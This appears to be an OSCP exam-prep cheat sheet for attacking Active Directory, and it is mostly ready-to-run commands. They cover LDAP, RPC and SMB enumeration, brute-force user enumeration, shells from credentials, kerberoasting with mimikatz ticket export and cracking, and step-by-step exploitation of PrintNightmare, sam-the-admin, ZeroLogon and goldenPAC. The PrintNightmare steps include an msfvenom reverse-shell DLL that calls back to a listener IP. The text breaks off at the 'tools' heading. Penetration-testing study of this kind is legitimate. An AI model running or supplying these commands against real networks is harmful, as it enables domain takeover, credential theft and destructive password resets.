# OSCP
<h4>General</h4>
https://cheatsheet.haax.fr/
<h4>Tunneling</h4>
https://michmich.eu/Cheatsheets/internal/07-pivoting/ <br>
https://github-wiki-see.page/m/lethanhtung01011980/Notes/wiki/SSH-tunneling <br>
https://book.hacktricks.xyz/tunneling-and-port-forwarding
<h4>Active Directory</h4>
https://www.xmind.net/m/5dypm8/

<article>
<h1 id="OSCP-AD-cheat-sheet">OSCP AD cheat sheet</h1>
<p>[2022-04-25]</p>
<a href="#intro">•&nbsp;intro</a><br> <a href="#find-the-dc">•&nbsp;find the dc</a><br> <a href="#you-dont-have-a-shell-or-credentials">•&nbsp;you dont have a shell or credentials</a><br> &nbsp;&nbsp;<a href="#recon">•&nbsp;recon</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#dns">•&nbsp;dns</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#user">•&nbsp;user</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#rpc">•&nbsp;rpc</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#smb">•&nbsp;smb</a><br> <a href="#you-have-a-shell-and-or-credentials">•&nbsp;you have a shell and or credentials</a><br> &nbsp;&nbsp;<a href="#get-a-shell">•&nbsp;get a shell</a><br> &nbsp;&nbsp;<a href="#basic-enumeration">•&nbsp;basic enumeration</a><br> &nbsp;&nbsp;<a href="#check-for-users-with-kerberos-preauth">•&nbsp;check for users with kerberos preauth</a><br> &nbsp;&nbsp;<a href="#check-for-kerberoastable-accounts">•&nbsp;check for kerberoastable accounts</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#get-spns">•&nbsp;get spns</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#request-the-ticket">•&nbsp;request the ticket</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#export-the-ticket">•&nbsp;export the ticket</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#crack-the-ticket">•&nbsp;crack the ticket</a><br> &nbsp;&nbsp;<a href="#check-for-the-big-exploits">•&nbsp;check for the big exploits</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#printernightmare">•&nbsp;printernightmare</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#sam-the-admin">•&nbsp;sam the admin</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#zerologon">•&nbsp;zerologon</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#goldenpac">•&nbsp;goldenpac</a><br> &nbsp;&nbsp;<a href="#tools">•&nbsp;tools</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#mimikatz">•&nbsp;mimikatz</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#rubeus">•&nbsp;rubeus</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#crackmapexec">•&nbsp;crackmapexec</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#bloodhound">•&nbsp;bloodhound</a><br> &nbsp;&nbsp;<a href="#other-techniques">•&nbsp;other techniques</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#pass-the-hash">•&nbsp;pass the hash</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#dump-local-sam">•&nbsp;dump local sam</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#dump-the-ntds">•&nbsp;dump the ntds</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#dc-sync-attack">•&nbsp;dc sync attack</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#spn-impersonate">•&nbsp;spn impersonate</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#show-laps-passwords">•&nbsp;show laps passwords</a><br> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#remote-registry">•&nbsp;remote registry</a><br><br>
<h2 id="intro">intro</h2>
<p>Here are some my tips and tricks that got me thru the AD part of the OSCP exam.</p>
<p>One important thing upfront that more than once made me loose hours:<br> <b>Use all found credentials on all found users!</b></p>
<p>Some additional links:<br> <a href="https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference">General AD cheat sheet</a><br> <a href="https://wadcoms.github.io/">WADComs</a> (The best site for AD movement)</p>
<h2 id="find-the-dc">find the DC</h2>
<p>Some ports that suggest that a server is a Domain Controller:</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="ex">TCP</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="ex">53</span>      - DNS</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="ex">88</span>      - Kerbeos</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a><span class="ex">135</span>     - RPC</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="ex">139/445</span> - SMB</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a><span class="ex">389</span>     - ldap</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a><span class="ex">464</span>     - kpasswd5</span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true"></a></span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true"></a><span class="ex">UDP</span></span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true"></a><span class="ex">53</span>      - DNS</span></code></pre></div>
<p>Add the DC and all found clients into your <code>/etc/hosts</code> file.</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="ex">192.168.99.10</span> dc1.domain.com dc1 domain.com</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a><span class="ex">192.168.99.20</span> client1.domain.com client1</span></code></pre></div>
<p>You could add the DC to your <code>/etc/resolv.conf</code>. But that will make internet research slower.</p>
<h2 id="you-dont-have-a-shell-or-credentials">you don’t have a shell or credentials</h2>
<h3 id="recon">recon</h3>
<h4 id="dns">DNS</h4>
<p>Use <a href="https://github.com/mschwager/fierce">fierce</a> to check for other servers inside the AD.</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="ex">fierce</span> --domain DOMAIN --dns-servers DCIP --subdomain-file /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</span></code></pre></div>
<h4 id="user">User</h4>
<h5 id="windapsearch">windapsearch</h5>
<p>Use <a href="https://github.com/ropnop/go-windapsearch">windapsearch</a> to make LDAP queries. Often does not require a password!</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="co"># query users</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a><span class="ex">windapsearch</span> -m users --dc DCIP</span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true"></a></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true"></a><span class="co"># query login names</span></span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true"></a><span class="ex">windapsearch</span> -m users --attrs UserPrincipalName --dc DCIP <span class="kw">|</span> <span class="fu">awk</span> -F<span class="st">"Name:"</span> <span class="st">'{print $2}'</span> <span class="kw">|</span> <span class="fu">awk</span> <span class="st">'!/^$/'</span></span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true"></a></span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true"></a><span class="co"># descriptions (often contain passwords)</span></span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true"></a><span class="ex">windapsearch</span> -m users --attrs Description --dc DCIP</span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true"></a></span>
<span id="cb4-10"><a href="#cb4-10" aria-hidden="true"></a><span class="co"># query all attributes for password</span></span>
<span id="cb4-11"><a href="#cb4-11" aria-hidden="true"></a><span class="ex">windapsearch</span> -m users --full --dc DCIP <span class="kw">|</span> <span class="fu">grep</span> -i password</span></code></pre></div>
<h5 id="kerbrute">kerbrute</h5>
<p>Use <a href="https://github.com/ropnop/kerbrute">kerbrute</a> to enumerate users</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="ex">kerbrute</span> userenum --dc DC -d DOMAIN /usr/share/wordlists/seclists/Usernames/Names/names.txt </span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a><span class="ex">kerbrute</span> userenum --dc DC -d DOMAIN /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt</span></code></pre></div>
<h5 id="cme">cme</h5>
<p>Use <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> to enumerate users</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="ex">cme</span> IP -u <span class="st">''</span> -p <span class="st">''</span> --users</span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="co"># get password policy</span></span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a><span class="ex">cme</span> IP -u <span class="st">''</span> -p <span class="st">''</span> --pass-poll</span></code></pre></div>
<h5 id="generate-names">generate names</h5>
<p>If there are names on a company website you can format those names with <a href="https://github.com/urbanadventurer/username-anarchy">username-anarchy</a>.</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="ex">username-anarchy</span> -i INFILE <span class="op">&gt;</span> OUTFILE</span></code></pre></div>
<h5 id="generate-passwords">generate passwords</h5>
<p>Crawl a website with <a href="https://github.com/digininja/cewl">cewl</a> and make it into a wordlist with the hashcat best64 rule.</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="ex">cewl</span> -d DEPTH -m MINIMUMLENGT --with-numbers -w OUTFILE LINK</span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a><span class="ex">hashcat</span> --force INFILE -r /usr/share/hashcat/rules/best64.rule --stdout <span class="op">&gt;</span> OUTFILE</span></code></pre></div>
<h4 id="rpc">RPC</h4>
<p>Could require credentials!</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="ex">rpcclient</span> -u <span class="st">''</span> IP </span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a>    <span class="ex">enumdomusers</span></span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a>    <span class="ex">enumdomgroups</span></span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a>    <span class="co"># check printer description for passwords</span></span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true"></a>    <span class="ex">enumprinters</span></span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true"></a></span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true"></a><span class="ex">impacket-rpcdump</span> IP</span></code></pre></div>
<p>Check for PrinterNightmare</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="ex">impacket-rpcdump</span> IP <span class="kw">|</span> <span class="fu">egrep</span> <span class="st">'MS-RPRN|MS-PAR'</span></span></code></pre></div>
<h4 id="smb">SMB</h4>
<p>Check for anonymous/open shares</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a><span class="ex">smbmap</span> -H IP</span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true"></a><span class="ex">cme</span> smb IP -u <span class="st">''</span> -p <span class="st">''</span> --shares</span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true"></a><span class="ex">enum4linux</span> IP</span></code></pre></div>
<h2 id="you-have-a-shell-and-or-credentials">you have a shell and or credentials</h2>
<h3 id="get-a-shell">get a shell</h3>
<p>Some ways to get a shell by just having a pair of credentials:</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a><span class="co"># common</span></span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true"></a><span class="ex">impacket-psexec</span> <span class="st">'DOMAIN\user:PASSWORD'</span> -target-ip IP -dc-ip DCIP</span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true"></a><span class="ex">impacket-smbexec</span> <span class="st">'DOMAIN\user:PASSWORD'</span> -target-ip IP -dc-ip DCIP</span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true"></a><span class="ex">impacket-wmiexec</span> <span class="st">'DOMAIN\user:PASSWORD'</span> -target-ip IP -dc-ip DCIP</span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true"></a></span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true"></a><span class="co"># winrm (port tcp/5985) need to be enabled</span></span>
<span id="cb12-7"><a href="#cb12-7" aria-hidden="true"></a><span class="ex">evil-winrm</span> -i IP -u <span class="st">'DOMAIN\user'</span> -p <span class="st">'PASSWORD'</span></span>
<span id="cb12-8"><a href="#cb12-8" aria-hidden="true"></a></span>
<span id="cb12-9"><a href="#cb12-9" aria-hidden="true"></a><span class="co"># RDP (port tcp/3389) needs to be enabled</span></span>
<span id="cb12-10"><a href="#cb12-10" aria-hidden="true"></a><span class="ex">rdesktop</span> -r clipboard:PRIMARYCLIPBOARD -r disk:host=/home/ -u <span class="st">'USER'</span> -p <span class="st">'PASSWORD'</span>  IP</span>
<span id="cb12-11"><a href="#cb12-11" aria-hidden="true"></a></span>
<span id="cb12-12"><a href="#cb12-12" aria-hidden="true"></a><span class="co"># rare</span></span>
<span id="cb12-13"><a href="#cb12-13" aria-hidden="true"></a><span class="ex">impacket-atexec</span> <span class="st">'DOMAIN\user:PASSWORD@IP'</span> <span class="st">'command'</span></span>
<span id="cb12-14"><a href="#cb12-14" aria-hidden="true"></a><span class="ex">impacket-dcomexec</span> <span class="st">'DOMAIN\user:PASSWORD@IP'</span></span></code></pre></div>
<h3 id="basic-enumeration">basic enumeration</h3>
<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a><span class="co"># get all users</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true"></a><span class="ex">net</span> users /domain</span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true"></a></span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true"></a><span class="co"># get the password policy</span></span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true"></a><span class="ex">net</span> accounts</span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true"></a></span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true"></a><span class="co"># check for stored credentials</span></span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true"></a><span class="ex">cmdkey</span> /list</span></code></pre></div>
<h3 id="check-for-users-with-kerberos-preauth">check for users with kerberos preauth</h3>
<div class="sourceCode" id="cb14"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a><span class="co"># asreproast</span></span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true"></a><span class="ex">impacket-GetNPUsers</span> <span class="st">'DOMAIN\user:PASSWORD'</span> -dc-ip DCIP </span></code></pre></div>
<h3 id="check-for-kerberoastable-accounts">check for kerberoastable accounts</h3>
<h4 id="get-spns">Get SPNs</h4>
<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a><span class="ex">impacket-GetUserSPNs</span> <span class="st">'DOMAIN\user:PASSWORD@DCIP'</span></span></code></pre></div>
<p>Basic PowerShell script you can run from a shell inside the AD:</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true"></a><span class="va">$PDC</span> = (<span class="va">$domainObj</span>.<span class="fu">PdcRoleOwner</span>).<span class="fu">Name</span></span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true"></a><span class="va">$SearchString</span> = <span class="st">"LDAP://"</span></span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true"></a><span class="va">$SearchString</span> += <span class="va">$PDC</span> + <span class="st">"/"</span></span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true"></a><span class="va">$DistinguishedName</span> = <span class="st">"DC=$domainObj.Name.Replace('.', ',DC='))"</span></span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true"></a><span class="va">$SearchString</span> += <span class="va">$DistinguishedName</span></span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true"></a><span class="va">$Searcher</span> = <span class="fu">New-Object</span> System.<span class="fu">DirectoryServices</span>.<span class="fu">DirectorySearcher</span>([ADSI]<span class="va">$SearchString</span>)</span>
<span id="cb16-7"><a href="#cb16-7" aria-hidden="true"></a><span class="va">$objDomain</span> = <span class="fu">New-Object</span> System.<span class="fu">DirectoryServices</span>.<span class="fu">DirectoryEntry</span></span>
<span id="cb16-8"><a href="#cb16-8" aria-hidden="true"></a><span class="va">$Searcher</span>.<span class="fu">SearchRoot</span> = <span class="va">$objDomain</span></span>
<span id="cb16-9"><a href="#cb16-9" aria-hidden="true"></a></span>
<span id="cb16-10"><a href="#cb16-10" aria-hidden="true"></a><span class="co"># Search by what</span></span>
<span id="cb16-11"><a href="#cb16-11" aria-hidden="true"></a><span class="va">$Searcher</span>.<span class="fu">filter</span>=<span class="st">"serviceprincipalname=*"</span></span>
<span id="cb16-12"><a href="#cb16-12" aria-hidden="true"></a></span>
<span id="cb16-13"><a href="#cb16-13" aria-hidden="true"></a><span class="va">$Result</span> = <span class="va">$Searcher</span>.<span class="fu">Findall</span>()</span>
<span id="cb16-14"><a href="#cb16-14" aria-hidden="true"></a></span>
<span id="cb16-15"><a href="#cb16-15" aria-hidden="true"></a><span class="fu">Write-Host</span> <span class="st">"---------------------------"</span></span>
<span id="cb16-16"><a href="#cb16-16" aria-hidden="true"></a><span class="kw">Foreach</span>(<span class="va">$obj</span> <span class="kw">in</span> <span class="va">$Result</span>)</span>
<span id="cb16-17"><a href="#cb16-17" aria-hidden="true"></a>{</span>
<span id="cb16-18"><a href="#cb16-18" aria-hidden="true"></a>    </span>
<span id="cb16-19"><a href="#cb16-19" aria-hidden="true"></a>    <span class="kw">ForEach</span>(<span class="va">$prop</span> <span class="kw">in</span> <span class="va">$obj</span>.<span class="fu">Properties</span>) {</span>
<span id="cb16-20"><a href="#cb16-20" aria-hidden="true"></a>        <span class="co"># uncommnent to print all attributes</span></span>
<span id="cb16-21"><a href="#cb16-21" aria-hidden="true"></a>        <span class="co">#$prop</span></span>
<span id="cb16-22"><a href="#cb16-22" aria-hidden="true"></a>    }</span>
<span id="cb16-23"><a href="#cb16-23" aria-hidden="true"></a>    <span class="fu">Write-Host</span> <span class="st">"[SAM Account Name]"</span></span>
<span id="cb16-24"><a href="#cb16-24" aria-hidden="true"></a>    <span class="va">$obj</span>.<span class="fu">Properties</span>.<span class="fu">samaccountname</span></span>
<span id="cb16-25"><a href="#cb16-25" aria-hidden="true"></a>    <span class="fu">Write-Host</span> <span class="st">""</span></span>
<span id="cb16-26"><a href="#cb16-26" aria-hidden="true"></a>    <span class="fu">Write-Host</span> <span class="st">"[User Principal Name]"</span></span>
<span id="cb16-27"><a href="#cb16-27" aria-hidden="true"></a>    <span class="va">$obj</span>.<span class="fu">Properties</span>.<span class="fu">userprincipalname</span></span>
<span id="cb16-28"><a href="#cb16-28" aria-hidden="true"></a>    <span class="fu">Write-Host</span> <span class="st">""</span></span>
<span id="cb16-29"><a href="#cb16-29" aria-hidden="true"></a>    <span class="fu">Write-Host</span> <span class="st">"[Service Principal Name]"</span></span>
<span id="cb16-30"><a href="#cb16-30" aria-hidden="true"></a>    <span class="va">$obj</span>.<span class="fu">Properties</span>.<span class="fu">serviceprincipalname</span></span>
<span id="cb16-31"><a href="#cb16-31" aria-hidden="true"></a>    <span class="fu">Write-Host</span> <span class="st">"---------------------------"</span></span>
<span id="cb16-32"><a href="#cb16-32" aria-hidden="true"></a>}</span></code></pre></div>
<h4 id="request-the-ticket">request the ticket</h4>
<p>To request the ticket you can use PowerShell:</p>
<div class="sourceCode" id="cb17"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true"></a><span class="fu">add-type</span> -assemblyname system.<span class="fu">identitymodel</span></span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true"></a><span class="fu">new-object</span> system.<span class="fu">identitymodel</span>.<span class="fu">tokens</span>.<span class="fu">kerberosrequestorsecuritytoken</span> -Argumentlist 'SPN'</span></code></pre></div>
<p>To request the ticket with mimikatz:</p>
<div class="sourceCode" id="cb18"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true"></a>.\mimikatz.<span class="fu">exe</span></span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true"></a>    kerberos::ask /target:SPN</span>
<span id="cb18-3"><a href="#cb18-3" aria-hidden="true"></a>    kerberos::list /export</span></code></pre></div>
<p>Verify that the ticket is in memory with <code>klist</code>.</p>
<h4 id="export-the-ticket">export the ticket</h4>
<p>Use <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> to export the ticket. This does not require admin or SYSTEM privileges.</p>
<div class="sourceCode" id="cb19"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true"></a>.\mimikatz.<span class="fu">exe</span></span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true"></a>    <span class="co"># verify the ticket exists</span></span>
<span id="cb19-3"><a href="#cb19-3" aria-hidden="true"></a>    kerberos::list</span>
<span id="cb19-4"><a href="#cb19-4" aria-hidden="true"></a>    <span class="co"># export to current folder</span></span>
<span id="cb19-5"><a href="#cb19-5" aria-hidden="true"></a>    kerberos::list /export</span></code></pre></div>
<h4 id="crack-the-ticket">crack the ticket</h4>
<p>Transfer the ticket to Kali, and crack it with <a href="https://github.com/nidem/kerberoast/">kerberoast</a>.</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true"></a><span class="co"># setup</span></span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true"></a><span class="ex">virtualenv</span> --python=python3 venv</span>
<span id="cb20-3"><a href="#cb20-3" aria-hidden="true"></a><span class="bu">source</span> venv/bin/activate</span>
<span id="cb20-4"><a href="#cb20-4" aria-hidden="true"></a><span class="fu">git</span> clone https://github.com/nidem/kerberoast/     </span>
<span id="cb20-5"><a href="#cb20-5" aria-hidden="true"></a><span class="bu">cd</span> kerberoast</span>
<span id="cb20-6"><a href="#cb20-6" aria-hidden="true"></a><span class="ex">pip3</span> install pyasn1</span>
<span id="cb20-7"><a href="#cb20-7" aria-hidden="true"></a></span>
<span id="cb20-8"><a href="#cb20-8" aria-hidden="true"></a><span class="co"># crack</span></span>
<span id="cb20-9"><a href="#cb20-9" aria-hidden="true"></a><span class="ex">python</span> tgsrepcrack.py /usr/share/wordlists/rockyou.txt ticket.kirbi</span></code></pre></div>
<p>Cracking is also possible with Hashcat and <a href="https://github.com/jarilaos/kirbi2hashcat">kirbi2hashcat</a>.</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true"></a><span class="ex">python</span> kirbi2hashcat.py ticket.kirbi <span class="op">&gt;</span> ticket.hashcat</span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true"></a><span class="ex">hashcat</span> --force ticket.hashcat -m 13100  /usr/share/wordlists/rockyou.txt</span></code></pre></div>
<h3 id="check-for-the-big-exploits">check for the big exploits</h3>
<p>Those exploits only require valid domain credentials.</p>
<h4 id="printernightmare">PrinterNightmare</h4>
<p>CVE-2021-1675</p>
<p>Check with:</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true"></a><span class="ex">impacket-rpcdump</span> IP <span class="kw">|</span> <span class="fu">egrep</span> <span class="st">'MS-RPRN|MS-PAR'</span></span></code></pre></div>
<p>Execute with:</p>
<div class="sourceCode" id="cb23"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true"></a></span>
<span id="cb23-2"><a href="#cb23-2" aria-hidden="true"></a><span class="co"># temrinal 1</span></span>
<span id="cb23-3"><a href="#cb23-3" aria-hidden="true"></a><span class="fu">git</span> clone https://github.com/cube0x0/impacket</span>
<span id="cb23-4"><a href="#cb23-4" aria-hidden="true"></a><span class="fu">wget</span> https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py -O ./impacket/CVE-2021-1675.py</span>
<span id="cb23-5"><a href="#cb23-5" aria-hidden="true"></a><span class="ex">virtualenv</span> --python=python3 impacket</span>
<span id="cb23-6"><a href="#cb23-6" aria-hidden="true"></a><span class="bu">source</span> impacket/bin/activate</span>
<span id="cb23-7"><a href="#cb23-7" aria-hidden="true"></a><span class="bu">cd</span> impacket</span>
<span id="cb23-8"><a href="#cb23-8" aria-hidden="true"></a><span class="ex">pip3</span> install .</span>
<span id="cb23-9"><a href="#cb23-9" aria-hidden="true"></a><span class="ex">pip2</span> install .</span>
<span id="cb23-10"><a href="#cb23-10" aria-hidden="true"></a></span>
<span id="cb23-11"><a href="#cb23-11" aria-hidden="true"></a><span class="co"># terminal 2</span></span>
<span id="cb23-12"><a href="#cb23-12" aria-hidden="true"></a><span class="bu">source</span> impacket/bin/activate</span>
<span id="cb23-13"><a href="#cb23-13" aria-hidden="true"></a><span class="bu">cd</span> impacket</span>
<span id="cb23-14"><a href="#cb23-14" aria-hidden="true"></a></span>
<span id="cb23-15"><a href="#cb23-15" aria-hidden="true"></a><span class="ex">msfvenom</span> -p windows/shell_reverse_tcp LHOST=LISTEINGIP LPORT=LISTENINGPORT -f dll -o evil.dll</span>
<span id="cb23-16"><a href="#cb23-16" aria-hidden="true"></a><span class="ex">smbserver.py</span> drop <span class="va">$(</span><span class="bu">pwd</span><span class="va">)</span> -smb2support</span>
<span id="cb23-17"><a href="#cb23-17" aria-hidden="true"></a></span>
<span id="cb23-18"><a href="#cb23-18" aria-hidden="true"></a><span class="co"># set up listener</span></span>
<span id="cb23-19"><a href="#cb23-19" aria-hidden="true"></a></span>
<span id="cb23-20"><a href="#cb23-20" aria-hidden="true"></a><span class="co"># terminal 1</span></span>
<span id="cb23-21"><a href="#cb23-21" aria-hidden="true"></a><span class="ex">python3</span> CVE-2021-1675.py domain.com/user:password@dcip <span class="st">'\\LISTEINGIP\drop\evil.dll'</span></span></code></pre></div>
<h4 id="sam-the-admin">SAM the admin</h4>
<p>CVE-2021-42278<br> CVE-2021-42287</p>
<p>Execute with:</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true"></a><span class="fu">git</span> clone https://github.com/WazeHell/sam-the-admin</span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true"></a><span class="bu">cd</span> sam-the-admin</span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true"></a><span class="ex">virtualenv</span> venv</span>
<span id="cb24-4"><a href="#cb24-4" aria-hidden="true"></a><span class="bu">source</span> venv/bin/activate</span>
<span id="cb24-5"><a href="#cb24-5" aria-hidden="true"></a><span class="ex">pip3</span> install -r requirements.txt</span>
<span id="cb24-6"><a href="#cb24-6" aria-hidden="true"></a><span class="ex">pip2</span> install -r requirements.txt</span>
<span id="cb24-7"><a href="#cb24-7" aria-hidden="true"></a></span>
<span id="cb24-8"><a href="#cb24-8" aria-hidden="true"></a><span class="ex">python</span> sam_the_admin.py DOMAIN/USER:PASSWORD -dc-ip DCIP -domain-netbios domain.com</span></code></pre></div>
<h4 id="zerologon">ZeroLogon</h4>
<p>CVE-2020-1472</p>
<p>Execute with</p>
<div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true"></a><span class="fu">git</span> clone https://github.com/risksense/zerologon/</span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true"></a><span class="bu">cd</span> zerologon</span>
<span id="cb25-3"><a href="#cb25-3" aria-hidden="true"></a></span>
<span id="cb25-4"><a href="#cb25-4" aria-hidden="true"></a><span class="co"># DC NAME NOT FQDN!</span></span>
<span id="cb25-5"><a href="#cb25-5" aria-hidden="true"></a><span class="ex">python3</span> set_empty_pw.py DCNAME DCIP</span></code></pre></div>
<h4 id="goldenpac">goldenPAC</h4>
<p>CVE-2014-6324</p>
<div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true"></a><span class="ex">impacket-goldenPac</span> <span class="st">'domain.com/user:password@dc'</span></span></code></pre></div>
<h3 id="tools">tools</h3>
